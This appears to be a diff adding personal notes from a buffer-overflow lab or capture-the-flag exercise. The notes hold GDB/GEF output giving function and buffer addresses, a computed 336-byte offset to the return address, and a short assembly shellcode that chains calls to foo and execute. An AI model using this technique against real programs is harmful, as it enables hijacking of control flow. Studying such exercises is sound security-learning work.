@@ -1,0 +1,47 @@
+gef➤  p bof
+$1 = {int (char *)} 0x5655624d <bof>
+gef➤  p foo
+$2 = {char *()} 0x565562a2 <foo>
+gef➤  p &buffer
+$3 = (char (*)[324]) 0xffffcaac
+gef➤  p $ebp
+$4 = (void *) 0xffffcbf8
+gef➤  p (void *)$ebp + 4 - (void *)&buffer
+$5 = 0x150
+gef➤  p/d (void *)$ebp + 4 - (void *)&buffer
+$6 = 336
+gef➤  p $ebp + 8
+$7 = (void *) 0xffffcc00
+gef➤  p execute
+$8 = {int (char *)} 0x56556286 <execute>
+
+main idea:
+
+go to bof
+overwrite the buffer, and return address to shell code
+which will call foo first and its return value will be used as 
+another function named execute
+
+mov ebx, 0x565562a2
+call ebx
+push eax
+mov ebx, 0x56556286
+call ebx
+
+
+gef➤  p &buffer
+$1 = (char (*)[324]) 0xffffcaec
+gef➤  p $ebp
+$2 = (void *) 0xffffcc38
+gef➤  p (void *) $ebp + 4 - (void *) &buffer
+$3 = 0x150
+gef➤  p/d (void *) $ebp + 4 - (void *) &buffer
+$4 = 336
+gef➤  p exec
+No symbol "exec" in current context.
+gef➤  p execute
+$5 = {int (char *)} 0x56556286 <execute>
+gef➤  p/d (void *) $ebp + 8
+$6 = -13248
+gef➤  p (void *) $ebp + 8
+$7 = (void *) 0xffffcc40
